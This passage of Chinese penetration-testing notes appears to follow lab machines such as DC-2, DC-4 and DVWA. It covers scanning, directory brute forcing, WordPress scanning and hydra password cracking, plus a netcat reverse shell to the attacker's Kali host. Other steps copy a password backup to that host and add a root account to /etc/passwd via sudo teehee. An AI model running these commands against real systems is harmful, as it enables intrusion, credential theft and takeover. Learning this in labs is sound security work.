-p\n被动模式:被动模式的方法更加隐蔽,但是速度会比较慢,网卡被设置为混杂模式来侦听网络内的arp数据包进行被动式探测,这种方式就需要网络内设备发送arp包才能被探测到。\n\n命令netdiscover -i eth0 -r 192.168.1.0/24\n\n都可以达到目的\n2-1-2.端口探测masscanmasscan是为了尽可能快地扫描整个互联网而创建的，根据其作者robert graham，这可以在不到6分钟内完成，每秒大约1000万个数据包。\nmasscan不建立完整的TCP连接，收到SYN&#x2F;ACK之后，发送RST结束连接。选项–banners除外。\nmasscan &lt;IP地址/范围&gt; -p端口选项 \n常用命令\nmasscan --rate&#x3D;10000 -p 1-65535 192.168.1.132 &#x2F;&#x2F;以10000的速率对192.168.1.132的所有端口扫描\nmasscan -p80,8080-8100 10.0.0.0&#x2F;8 &#x2F;&#x2F;扫描指定网段的80和8080-8100之间的端口\nmasscan 10.0.0.0&#x2F;8 -p80 --banners --source-ip x.x.x.x &#x2F;&#x2F;完成TCP连接的同时获取目标应用程序的Banner信息\nmasscan 222.182.111.1&#x2F;24 -p80 &#x2F;&#x2F;扫描某一个端口\nmasscan 222.182.111.1&#x2F;24 -p80,81,8080 &#x2F;&#x2F;扫描多个端口\nmasscan 222.182.111.1&#x2F;24 -p22-25 &#x2F;&#x2F;扫描多个端口\nmasscan 222.182.111.1&#x2F;24 -p80 --rate 100000 &#x2F;&#x2F;指定扫描速度(每秒扫描100000个数据包)\nmasscan 222.182.111.1&#x2F;24 -p80 --excludefile &#x2F;root&#x2F;target.txt  &#x2F;&#x2F;指定不扫描某文件内的ip\nmasscan 222.182.111.1&#x2F;24 -p80 &gt; &#x2F;root&#x2F;results.txt  &#x2F;&#x2F;指定扫描结果保存在某一文件\nmasscan 222.182.111.1&#x2F;24 -p0-65535 --rate 100000 &#x2F;&#x2F;扫描所有端口\n\nIP地址范围，有三种有效格式：\n1、单独的IPv4地址\n2、类似&quot;10.0.0.1-10.0.0.233&quot;的范围地址\n3、CIDR地址类似于&quot;0.0.0.0&#x2F;0&quot;，多个目标可以用逗号隔开\n\n-p &lt;ports,–ports &gt; 指定端口进行扫描\n–banners 获取banner信息，支持少量的协议\n–rate 指定发包的速率\n-c , --conf 读取配置文件进行扫描\n–echo将当前的配置重定向到一个配置文件中\n-e , --adapter 指定用来发包的网卡接口名称\n–adapter-ip 指定发包的IP地址\n–adapter-port 指定发包的源端口\n–adapter-mac 指定发包的源MAC地址\n–router-mac 指定网关的MAC地址\n–exclude &lt;ip&#x2F;range&gt;IP地址范围黑名单，防止masscan扫描\n–excludefile 指定IP地址范围黑名单文件\n–includefile，-iL 读取一个范围列表进行扫描\n–ping扫描应该包含ICMP回应请求\n–append-output 以附加的形式输出到文件\n–iflist 列出可用的网络接口，然后退出–retries 发送重试的次数，以1秒为间隔\n–nmap打印与nmap兼容的相关信息\n–http-user-agent 设置user-agent字段的值\n–show[open,close] 告诉要显示的端口状态，默认是显示开放端口\n–noshow [open,close] 禁用端口状态显示\n–pcap 将接收到的数据包以libpcap格式存储\n–regress 运行回归测试，测试扫描器是否正常运行\n–ttl 指定传出数据包的TTL值，默认为255\n–wait 指定发送完包之后的等待时间，默认为10秒\n–offline 没有实际的发包，主要用来测试开销\n-sL 不执行扫描，主要是生成一个随机地址列表\n–readscan 读取从-oB生成的二进制文件，可以转化为XML或者JSON格式\n–connection-timeout 抓取banners时指定保持TCP连接的最大秒数，默认是30秒。\n\n\nnmapNmap（Network Mapper，网络映射器）是一款开放源代码的网络探测和安全审核工具，俗称扫描器之王。它的设计目标是快速地扫描大型网络，当然用它扫描单个主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些主机提供什么服务（应用程序名和版本），那些服务运行在什么操作系统（包括版本信息），它们使用什么类型的报文过滤器&#x2F;防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息，管理服务升级计划，以及监视主机和服务的运行。\n命令大全:\nnmap -sT 192.168.96.4  &#x2F;&#x2F;TCP连接扫描，不安全，慢\nnmap -sS 192.168.96.4  &#x2F;&#x2F;SYN扫描,使用最频繁，安全，快\nnmap -Pn 192.168.96.4  &#x2F;&#x2F;目标机禁用ping，绕过ping扫描\nnmap -sU 192.168.96.4  &#x2F;&#x2F;UDP扫描,慢,可得到有价值的服务器程序\nnmap -sI 僵尸ip 目标ip  &#x2F;&#x2F;使用僵尸机对目标机发送数据包\nnmap -sA 192.168.96.4  &#x2F;&#x2F;检测哪些端口被屏蔽\nnmap 192.168.96.4 -p &lt;portnumber&gt;  &#x2F;&#x2F;对指定端口扫描\nnmap 192.168.96.1&#x2F;24 &#x2F;&#x2F;对整个网段的主机进行扫描\nnmap 192.168.96.4 -oX myscan.xml &#x2F;&#x2F;对扫描结果另存在myscan.xml\nnmap -T1~6 192.168.96.4  &#x2F;&#x2F;设置扫描速度，一般T4足够。\nnmap -sV 192.168.96.4  &#x2F;&#x2F;对端口上的服务程序版本进行扫描\nnmap -O 192.168.96.4  &#x2F;&#x2F;对目标主机的操作系统进行扫描\nnmap -sC &lt;scirptfile&gt; 192.168.96.4  &#x2F;&#x2F;使用脚本进行扫描，耗时长\nnmap -A 192.168.96.4  &#x2F;&#x2F;强力扫描，耗时长\nnmap -6 ipv6地址   &#x2F;&#x2F;对ipv6地址的主机进行扫描\nnap -f 192.168.96.4  &#x2F;&#x2F;使用小数据包发送，避免被识别出\nnmap –mtu &lt;size&gt; 192.168.96.4 &#x2F;&#x2F;发送的包大小,最大传输单元必须是8的整数\nnmap -D &lt;假ip&gt; 192.168.96.4 &#x2F;&#x2F;发送参杂着假ip的数据包检测\nnmap --source-port &lt;portnumber&gt; &#x2F;&#x2F;针对防火墙只允许的源端口\nnmap –data-length: &lt;length&gt; 192.168.96.4 &#x2F;&#x2F;改变发生数据包的默认的长度，避免被识别出来是nmap发送的。\nnmap -v 192.168.96.4  &#x2F;&#x2F;显示冗余信息(扫描细节)\nnmap -sn 192.168.96.4  &#x2F;&#x2F;对目标进行ping检测，不进行端口扫描（会发送四种报文确定目标是否存活,）\nnmap -sP 192.168.96.4  &#x2F;&#x2F;仅仅对目标进行ping检测。\nnmap -n&#x2F;-p 192.168.96.4  &#x2F;&#x2F;-n表示不进行dns解析，-p表示要\nnmap --system-dns 192.168.96.4  &#x2F;&#x2F;扫描指定系统的dns服务器\nnmap –traceroute 192.168.96.4  &#x2F;&#x2F;追踪每个路由节点。\nnmap -PE&#x2F;PP&#x2F;PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。\nnmap -sP 192.168.96.4       &#x2F;&#x2F;主机存活性扫描，arp直连方式。\nnmap -iR [number]       &#x2F;&#x2F;对随机生成number个地址进行扫描。\n\n常用:\nnmap –sS -p 端口号 -v IP &#x2F;&#x2F;扫描指定IP开放端口\nnmap IP -v -p 1-65535 &#x2F;&#x2F;指定端口号1-65535，显示扫描过程\nnmap IP -p 53,161 &#x2F;&#x2F;只扫描53，161端口\nnmap –Pn&#x2F;P0 -A IP &#x2F;&#x2F;穿透防火墙扫描\nnmap -F IP -v &#x2F;&#x2F;快速扫描\nnmap --script&#x3D;vuln IP &#x2F;&#x2F;使用vuln脚本进行常见的漏洞扫描\nnmap -sV -v IP &#x2F;&#x2F;指纹识别扫描，扫描系统和程序版本号检测，并且输出详细信息\nnmap -sL -R IP&#x2F;24 -v &#x2F;&#x2F;扫描整个C段，反向域名解析\nnmap -p 80,443,445 -sV -A ip &#x2F;&#x2F;对指定端口进行精细扫描\nnmap -sV -T4 -O -p 80,22 192.168.15.152 &#x2F;&#x2F;常用端口扫描,版本探测和操作系统识别\n\n\n2-1-3.指纹识别whatwebwhatweb 是kali中网站指纹识别的工具，使用Ruby语言开发。whatweb可识别web技术，包括内容管理系统(CMS)、博客平台、统计&#x2F;分析包、JavaScript库，Web服务器和嵌入式设备等。它有超过900个插件，每个插件都能识别不同的东西。Whatweb还可以识别版本号，电子邮件地址、账户ID、Web框架模块，SQL错误等。\nWhatWeb可以隐秘、快速、彻底或缓慢扫描。WhatWeb支持攻击级别来控制速度和可靠性之间的权衡。当在浏览器中访问网站时，该交易包含许多关于Web技术为该网站提供支持的提示。有时，单个网页访问包含足够的信息来识别网站，但如果没有，WhatWeb可以进一步询问网站。默认的攻击级别称为“被动”，速度最快，只需要一个网站的HTTP请求。这适用于扫描公共网站。在渗透测试中开发了更积极的模式。\n用法： weatweb 域名\n\n-i 指定要扫描的文件\n-v 详细显示扫描的结果\n-a 指定运行级别\n\n常用指令:\nwhatweb 网址 &#x2F;&#x2F;单个目标\nwhatweb -v 192.168.1.100 &#x2F;&#x2F;详细输出\nwhatweb -input-file&#x3D;路径 or whatweb -i 路径 &#x2F;&#x2F;从外部导入目标数据进行批量探测\nwhatweb -a 等级 域名 （可以和-v参数结合使用)\nwhatweb --no-errors -t 255 内网网段 （可以和-a和-v参数结合使用) &#x2F;&#x2F;快速本地扫描（扫描内网主机）\nwhatweb http:&#x2F;&#x2F;www.baidu.com --log-xml&#x3D;baidu.xml &#x2F;&#x2F;将扫描结果导出至文件内\nwhatweb -l &#x2F;&#x2F;列出所有插件\n\n\n参数说明:\n-i : 指定要扫描的文件\n-v : 详细显示扫描的结果\n-a : 指定运行级别（1-4）\n\tstealthy 每个目标发送一次http请求，并且会跟随重定向\n\tunused 不可用（从2011年开始，此参数就是在开发状态\n\taggressive 每个目标发送少量的http请求，这些请求时根据参数为1时结果\t 确定的\n\theavy 每个目标会发送大量的http请求，会去尝试每一个插件\n–log-brief&#x3D;FILE 简要的记录，每个网站只记录一条返回信息\n–log-verbose&#x3D;FILE 详细输出\n–log-xml&#x3D;FILE 返回XML格式的日志\n–log-json&#x3D;FILE 以 json 格式记录日志\n–log-json-verbose&#x3D;FILE 记录详细的json日志\n–log-magictree&#x3D;FILE XML的树形结构\n\n\n2-1-4.目录扫描dirbdirb是一个基于字典的web目录扫描工具，会用递归的方式来获取更多的目录，它还支持代理和http认证限制访问的网站\n\n\n\n\n\n\n\n\n\n一些参考文章\nhttps://blog.csdn.net/weixin_44912169/article/details/105655195\nhttps://blog.csdn.net/liver100day/article/details/121394188\n对目标进行基本的扫描\ndirb http:&#x2F;&#x2F;192.168.186.131&#x2F;  #192.168.186.131为目标IP地址\n\n\n列举具有特定扩展名列表的目录\n在很多情况下，我们需要在目标服务器上提取特定扩展名的目录，然后可以使用dirb扫描的-X参数。此参数接受文件扩展名，然后在目标服务器或计算机上搜索给定的扩展名文件。\ndirb http:&#x2F;&#x2F;192.168.186.131&#x2F; -X .php #192.168.186.131为目标IP地址，.php为我们需要搜索的指定扩展名文件\n\n将输出保存到磁盘\ndirb http:&#x2F;&#x2F;192.168.186.131&#x2F; -o output.txt #192.168.186.131为目标IP地址， output.txt为将输出保存的文件名\n\n使用&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt 字典来扫描Web服务\ndirb http:&#x2F;&#x2F;192.168.1.116 &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt \n\n\n\nnikto基于perl语言开发的web页面扫描器。其特点扫描全面，速度快。\nNikto是一个开源的WEB扫描评估软件，可以对Web服务器进行多项安全测试，能在230多种服务器上扫描出 2600多种有潜在危险的文件、CGI及其他问题。Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等。\n\n\n\n\n\n\n\n\n\n官方网站\nhttps://cirt.net/Nikto2\nGithub源码\nhttps://github.com/sullo/nikto\n英文文档\nhttps://cirt.net/nikto2-docs/\n普通扫描\n对目标进行扫描，参数是 host，host 后可跟 ip 地址，也可跟域名 url 的形式\nnikto -h baidu.com\nnikto -host http:&#x2F;&#x2F;172.168.1.105\n\n扫描https网站\nnikto默认扫描会目标80端口，http协议，我们可以控制参数使得nikto对目标https协议，443端口进行扫描，并检查 ssl 一些常见的问题\nnikto -host www.baidu.com -port 443 -ssl\nnikto -host http:&#x2F;&#x2F;172.168.1.105 -ssl -port 443\n\n指定目录进行扫描\n有时候我们只需要扫描网站下的某个子目录，使用-c 参数指定扫描的目录，使用-c all 可进行目录爆破，并扫描\nnikto -host http:&#x2F;&#x2F;192.168.1.7 -c &#x2F;dvwa\n\n多目标扫描\nnikto支持多个目标进行扫描，将多个地址写入到文本中，通过- host参数+文本的方式即可统一进行扫描\nnikto -host list.txt\n\n其他功能\n以输出html文件格式输出扫描结果，具体命令如下：\nnikto -host http:&#x2F;&#x2F;www.example.com -o result.html -F html\n\n\nIDS 躲避\nnikto 在扫描过程中也可以使用它自带的 ids 躲避规则，参数是 - evasion，nikto 提供了八种躲避规则，通过 man 手册可查看详细信息\n\n\n\n1\n随机的 url 编码\n\n\n\n2\n只选择路径\n\n\n3\n提前结束 url\n\n\n4\n优先考虑长随机字符串\n\n\n5\n参数欺骗\n\n\n6\n使用 tab 作为命令分隔符\n\n\n7\n使用变化的 url\n\n\n8\n使用 windows 路径分隔符。\n\n\n使用方法直接 evasion 后跟序号即可\n使用 ids 躲避规则的123456 条对百度进行了扫描\nnikto -host https://www.baidu.com -ssl -port 443 -evasion 123456\n使用代理扫描\n扫描目标时，部分目标部署了防护设备，为避免暴露 ip可以使用代理进行扫描，nikto 支持设置代理，参数是 - useproxy。在使用时需要配合其他代理工具（比如proxychains）使用\nnikto -h https:&#x2F;&#x2F;www.baidu.com -useproxy http:&#x2F;&#x2F;127.0.0.1:1080\n\n\n\nnmapnmap加载脚本引擎扫描目录\nnmap --script=http-enum ip/url\ndirbuster目录暴力破解,图形化工具\ndirbuster\n\n\ndirbuster字典位置/usr/share/wordlists/dirbuster\ndirsearchdirsearch是一个基于python3的命令行工具，常用于暴力扫描页面结构，包括网页中的目录和文件。相比其他扫描工具disearch的特点是：\n\n支持HTTP代理\n多线程\n支持多种形式的网页（asp,php）\n生成报告（纯文本，JSON）\n启发式检测无效的网页\n递归扫描用户代理随机化\n批量处理\n扫描器与字典（注：字典必须是文本文件）\n\n常用指令:\n\n\n\n\n\n\n\n\n\ndirsearch的命令这篇文章写的非常详细\nhttps://blog.csdn.net/qq_43936524/article/details/115271837\ndirsearch -u http:&#x2F;&#x2F;192.168.88.132:8848&#x2F; -e*\ndirsearch -u http:&#x2F;&#x2F;192.168.88.132:8848&#x2F; -e* -w  &#x2F;root&#x2F;dirsearch&#x2F;db&#x2F;dicc.txt &#x2F;&#x2F;指定字典\npython3 dirsearch.py -u http:&#x2F;&#x2F;192.168.52.143 -e * -i 200 --full-url --xml-report&#x3D;1.xml &#x2F;&#x2F;将检查结果以xml形式存放\n\n常用命令 \n--version            显示dirsearch的版本\n-h --help            帮助提示\n-u  --url            指定网址\n-e                   指定网站语言\n-w                   指定字典\n-r                   递归目录（跑出目录后，继续跑目录下面的目录）\n-l  --url-list&#x3D;FILE  目标url文件路径\n-i                   保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)\n-x                   排除的响应状态码(以逗号分隔,支持指定范围)  如(-x 301,500-599)\n\n\n\n\n\n2-1-5.页面信息探测WappalyzerWappalyzer是一款功能强大的、且非常实用的chrome网站技术分析插件，通过该插件能够分析目标网站所采用的平台构架、\n网站环境、服务器配置环境、JavaScript框架、编程语言等参数，使用时很简单，开启你要分析、检测的网页后，点选该图示即可看到网站使用的相关技术和服务\n\ncewlCewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。\n默认方法\n输入下列命令之后，爬虫会根据指定的URL和深度进行爬取，然后打印出可用于密码破解的字典：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F;\n\n\n\n保存字典文件\n为了方便大家记录，或者为将来的研究提供参考，Cewl可以将打印出的字典存储为文件。这里可以使用-w参数来将密码字典存储为text文件：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -w dict.txt\n\n我们可以使用下列命令查看密码字典是否存储成功，我们的存储路径为&#x2F;root &#x2F;dict.txt：\ncat dict.txt\n\n\n\n生成特定长度的字典\n如果你想生成指定长度的密码字典，你可以使用-m选项来设置：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -m 9\n\n上述命令将生成长度至少为9位的密码，，Cewl对目标网站进行了爬取，并打印出了长度至少为9位的密码\n从网站中获取Email\n你可以使用-e选项来启用Email参数，并配合-n选项来隐藏工具在爬取网站过程中生成的密码字典：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -n -e\n\n此时，工具成功在网站中发现了一个Email地址\n计算网站字典中重复的单词数量\n如果你想要计算目标网站中某个词的重复出现次数，你可以使用-c选项来开启参数计算功能：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -c\n\nCewl可以直接统计出目标网站中重复的单词数量\n增加爬取深度\n如果你想增加爬虫的爬取深度以生成更大的字典文件，你可以使用-d选项来指定爬取深度，默认的爬取深度为2：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -d 3\n\n\n\n提取调试信息\n你可以使用–debug选项来开启调试模式，这样就可以查看网站爬取过程中出现的错误和元数据了：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; --debug\n\n\n\nVerbose模式\n为了扩展网站爬取结果，并获取更加完整的数据报告，你可以使用-v选项来进入verbose模式。该模式下，Cewl会导出目标网站的详细数据：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -v\n\n\n\n生成包含数字和字符的字典\n如果你想生成包含数字和字符的字典文件，你可以在命令中使用–with-numbers选项：\ncewl http:&#x2F;&#x2F;testphp.vulnweb.com&#x2F; --with-numbers\n\n\n\nCewl摘要&#x2F;基础认证\n如果目标网站需要进行页面登录认证的话，我们就要使用下列参数来绕过页面认证的限制：\n–auth_type:                      Digest or basic.\n–auth_user:                     Authentication username.\n–auth_pass:                     Authentication password.\ncewl http:&#x2F;&#x2F;192.168.1.105&#x2F;dvwa&#x2F;login.php --auth_type Digest --auth_user admin--auth_pass password -v\n\n或者\ncewl http:&#x2F;&#x2F;192.168.1.105&#x2F;dvwa&#x2F;login.php --auth_type basic --auth_user admin--auth_pass password -v\n\n接收到的http响应码为200，并成功生成了字典\n代理URL\n如果目标网站设置了代理服务器的话，Cewl将无法使用默认命令来生成字典。此时你需要使用–proxy option选项来启用代理URL功能：\ncewl --proxy_host 192.168.1.103 --proxy_port 3128 -w dict.txt http:&#x2F;&#x2F;192.168.1.103&#x2F;wordpress&#x2F;\n\n\n\nwpscan​\tWPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。\n\n\n\n\n\n\n\n\n\nhttps://www.freebuf.com/sectool/174663.html\nhttps://blog.csdn.net/liver100day/article/details/117585795\n扫描WordPress站点\n我们可以使用–enumerate选项来扫描并发现关于目标站点主题、插件和用户名信息。输入下列命令开始对服务器进行扫描：\nwpscan --url http:&#x2F;&#x2F;dc-2\n\n如果你不知道目标服务器的IP地址，你可以直接输入URL地址。\n主题扫描\n使用下列命令对主题进行扫描：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate t\n\n使用下列命令扫描主题中存在的漏洞：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vt\n\n\n\n插件扫描\n插件可以扩展WordPress站点的功能，但很多插件中都存在安全漏洞，而这也会给攻击者提供可乘之机。\n我们可以使用下列命令扫描WordPress站点中安装的插件：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate p\n\n接下来，我们可以使用下列命令来扫描目标插件中的安全漏洞：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vp\n\n\n\n使用wpscan进行暴力破解\nwpscan --url http:&#x2F;&#x2F;dc-2 -P &#x2F;home&#x2F;liver100day&#x2F;桌面&#x2F;dc2_passwords.txt -U &#x2F;home&#x2F;liver100day&#x2F;桌面&#x2F;dc2_username.txt\n\n\n\n命令集合\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vp,vt,tt,u\n\n\n\n\n\n2-2.主机信息收集2-2-1.查看当前用户whoami\n\n2-2-2.查看内核版本信息uname -a\n\nlsb_release -a\n\n2-2-3.查看账户信息文件cat /etc/passwd\n\n可以收集到很多信息\n一般看到这种id就可以猜测是不是用户名了\n\n可以通过ls -l /home查看home文件夹下有没有之前发现的用户名来验证用户信息\n\n2-2-4.收集用户信息通过之前验证的信息\n然后就可以用ls和cat依次遍历和查看用户文件夹收集信息\n\n\n查看指定文件有多少行cat 文件名 | wc -l\n\n把受害者主机中的文件拷贝到kali主机\nscp /home/space/music/1.mp3 root@www.runoob.com(或者ip):/home/root/others/music \n报错提示连接不上ssh\n\nkali怎么开启ssh可以看这两篇文章\n\n\n\n\n\n\n\n\n\nhttps://www.cnblogs.com/wangjinyu/p/12212536.html\nhttps://www.cnblogs.com/dggsec/p/9465072.html\nscp /home/jim/backups/old-passwords.bak root@192.168.1.133:~/Desktop\n\n就可以成功把文件拷贝到kali上了\n2-2-5.查看某个系统命令是否存在可以通过which来查看某个系统命令是否存在以及执行的到底是哪一个位置的命令\nwhich 可执行文件名称\n\n\n逃避IDS&#x2F;IPS&#x2F;FW\n发现网络中开放的端口\n端口扫描工具\n识别服务（服务的指纹）\nOS类型\n服务枚举\n开源信息收集\n\n\t\nhash-identifier  检测加密字符串是哪种哈希加密，标识所采用的哈希算法\n3.漏洞探测弱口令\nkali中的爆破字典位置 &#x2F;usr&#x2F;share&#x2F;wordlists  rockyou.txt\n\n\n一般默认是没有解压的,我们要自行解压\ngunzip /usr/share/wordlists/rockyou.txt.gz  \n\n查看密码本大小及密码数量\nls -lh /usr/share/wordlists/rockyou.txt查看大小\n\nwc -l /usr/share/wordlists/rockyou.txt查看条数\n\n可是看到kali自带的字典是很大的\n也可以自己设置字典\ncat &gt;&gt; 文件名.txt &lt;&lt; EOF\n\n方法二：使用Hydra暴力破解密码\n\n\n\n\n\n\n\n\n\nhydra使用教程\nhttps://blog.csdn.net/huweiliyi/article/details/105523823\nhttps://blog.csdn.net/weixin_43510203/article/details/107594228\nhttps://cloud.tencent.com/developer/article/1595096\n4.漏洞验证（利用）弱口令爆破kali自带字典暴力破解能成功最重要的条件还是要有一个强大的密码字典！Kali默认自带了一些字典，在 &#x2F;usr&#x2F;share&#x2F;wordlists 目录下\ndirbbig.txt #大的字典\nsmall.txt #小的字典\ncatala.txt #项目配置字典\ncommon.txt #公共字典\neuskera.txt #数据目录字典\nextensions_common.txt #常用文件扩展名字典\nindexes.txt #首页字典\nmutations_common.txt #备份扩展名\nspanish.txt #方法名或库目录\nothers #扩展目录，默认用户名等\nstress #压力测试\nvulns #漏洞测试\n\ndirbusterapache-user-enum-** #apache用户枚举\ndirectories.jbrofuzz #目录枚举\ndirectory-list-1.0.txt #目录列表大，中，小 big，medium，small\n\n\n\nhydraHydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具。Hydra是一个验证性质的工具，主要目的是：展示安全研究人员从远程获取一个系统认证权限。\n语法:\nhydra 参数 IP 服务\n\n参数:\n-l login 小写，指定用户名进行破解\n-L file 大写，指定用户的用户名字典\n-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。\n-P file 大写，用于指定密码字典。\n-M file 指定目标ip列表文件，批量破解。\n-o file 指定结果输出文件\n-t tasks 同时运行的线程数，默认是16\n-v &#x2F; -V 显示详细过程\n-R 恢复爆破（如果破解中断了，下次执行 hydra -R 继续从上一次进度接着破解&#x2F;path&#x2F;to&#x2F;hydra.restore 就可以继续任务。）\n-x 自定义密码。\n-S\t大写，采用SSL链接\n-s\t小写，可通过这个参数指定非默认端口\n-e\t可选选项，n：空密码试探，s：使用指定用户和密码试探\n-C\t使用冒号分割格式，例如“登录名:密码”来代替 -L&#x2F;-P 参数\n-f\t在使用-M参数以后，找到第一对登录名或者密码的时候中止破解\n-w\t设置最大超时的时间，单位秒，默认是30s\nserver\t目标ip\nservice\t指定服务名，支持的服务和协议\n\n服务:\nservice：指定服务名，支持的服务跟协议有：telnet，ftp，pop3等等。\n注意：\n1.自己创建字典,然后放在当前的目录下或者指定目录。\n2.参数可以统一放在最后，格式比如hydra ip 服务 参数。\n3.如果能确定用户名一项时候，比如web登录破解，直接用 -l就可以，然后剩余时间破解密码。\n4.缺点，如果目标网站登录时候需要验证码就无法破解。\n5.man hydra最万能。\n6.或者hydra -U http-form等查看具体帮助。\n\n\n\n破解ssh我们使用如下命令\nhydra -L user.txt -P passwd.txt -o ssh.txt -vV -t ip  ssh -s 22   \n-L 指定用户字典文件 \n-P 指定密码字典文件  \n-o 把成功的输出到ssh.txt文件 \n-vV 显示详细信息  \n-s 指定其他端口 如果要修改默认22端口，可以使用 -s 参数\n\nhttp协议破解get方式提交，破解web登录：\n \nhydra -L 用户名字典 -P 密码字典 -t 线程 -v -e ns IP地址 http-get &#x2F;admin&#x2F;\nhydra -L 用户名字典 -P 密码字典 -t 线程 -v -e ns -f IP地址 http-get &#x2F;admin&#x2F;index.php\n \npost方式提交，破解web登录：\n \nhydra -f -l 用户名 -P 密码字典 -V -s 9900 IP地址 http-post-form &quot;&#x2F;admin&#x2F;index.php?action&#x3D;login:user&#x3D;USER&amp;pw&#x3D;PASS:&quot;\n \n \n#&#x2F;index.php …这个是登录的 url\n#后门是POST的数据 其中的用户名密码使用 USER PASS 来代替\n#然后是如果登录出错 会出现的字符 。。。然后开始破解\n\nhttps协议破解hydra -m &#x2F;index.php -l 用户名 -P 密码字典.txt IP地址 https\n\nhttp-proxy协议破解hydra -l admin -P 字典.txt http-proxy:&#x2F;&#x2F;IP地址\n\n\n\n密码破解john​\tJohn the Ripper 是一款大受欢迎的、免费的开源软件。也是一个基于字典的快速破解密码的工具，是一款用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如 DES 、 MD4 、 MD5 等。 John the Ripper 支持字典破解方式和暴力破解方式。它支持多种不同类型的系统架构，包括 Unix 、 Linux 、 Windows 、 DOS 模式、 BeOS 和 OpenVMS ，主要目的是破解不够牢固的 Unix/Linux 系统密码\n一些参考文章\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/i_can1/article/details/107227565\nhttps://www.cnblogs.com/HelloCTF/p/13346125.html\nhttps://www.cnblogs.com/Junglezt/p/16048189.html\n反弹shell参考文章\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/mirocky/article/details/112674080\nhttps://cloud.tencent.com/developer/article/1818091\nhttps://www.freebuf.com/articles/web/247967.html\n利用nc借助kali的nc工具\nnc 借助tcp&#x2F;ip传输数据\n远程控制\n正向连接\n反向连接(反弹shell)   让目标主动连接我方kali等设备,成功之后把shell传给攻击者\nkali端:nc -l -p 888(随便一个端口,但一定要是未使用的)\nnc -l -p 888    \n&#x2F;&#x2F;kali开启侦听某一端口,这里相当于kali变成了服务端\n&#x2F;&#x2F;-l 侦听(listen)\n&#x2F;&#x2F;-p 指定侦听的端口\n\n\n目标端(受害者):nc -nv kali主机ip 2226 -c /bin/bash \nnc -nv kali主机ip 888 -c &#x2F;bin&#x2F;bash   \n&#x2F;&#x2F;-c 传递一个shell命令,&#x2F;bin&#x2F;bash就相当把受害主机的shell传过去了\n&#x2F;&#x2F;-n 不做名称解析,提高连接速度\n&#x2F;&#x2F;-v 显示详细信息\n\n\n就可以看到kali已经拿到shell了\n\n获取一个交互式的shell:python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\n\n横向移动可以根据已得到的信息，条件去获取(渗透)系统或LAN内的其他主机的权限(信息)的一种攻击行为\n这里拿dc-4靶机举例\n1.信息收集同之前的信息收集类似\nuname -r           看内核信息\nip a               看IP地址\nhostname           看主机名\nwhoami             看当前用户\ncat &#x2F;etc&#x2F;passwd    看账户信息\nls &#x2F;home           验证用户信息(看有没有他名字对应的文件夹)\n\n之后把你收集到的信息转移到kali中\ncp /home/jim/backups/old-passwords.bak root@192.168.1.133:~/Desktop\n2.针对用户制作字典可以利用信息收集得到的情报制作字典\n3.尝试使用工具破解远程主机这里主要介绍使用hydra破解远程主机\nhydra -L username.txt -P old-passwords.bak 192.168.1.132 ssh\n\n4.ssh远程登录ssh jim@192.168.1.132,然后输入密码\n\n\n5.提权见本篇提权部分\n5.权限维持5-1.rbash逃逸rbash(The restricted mode of bash),也就是限制型bash；是平时所谓的 restricted shell的一种，也是最常见的 restricted shell（rbash、ksh、rsh等）\n一些参考文章\n\n\n\n\n\n\n\n\n\nhttps://xz.aliyun.com/t/7642\nhttps://blog.csdn.net/qq_43168364/article/details/111830233\n6.权限提升6-1.前期工作6-1-1.收集漏洞这里介绍kali的searchsploit\nsearchsploit通过搜索关键词找到需要的漏洞，可以理解为一个离线的漏洞库\n详细使用见:\n\n\n\n\n\n\n\n\n\nhttps://zhuanlan.zhihu.com/p/366946217\n\n6-1-2.查看自己的sudo授权列表sudo -l\n\n\n6-1-3.尝试切换用户su - 用户名\n输入密码\n6-2.teehee提权teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权\n核心思路就是利用其在passwd文件中追加一条uid为0的用户条目\necho &quot;raaj::0:0:::&#x2F;bin&#x2F;bash&quot; | sudo teehee -a &#x2F;etc&#x2F;passwd\n\n按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su 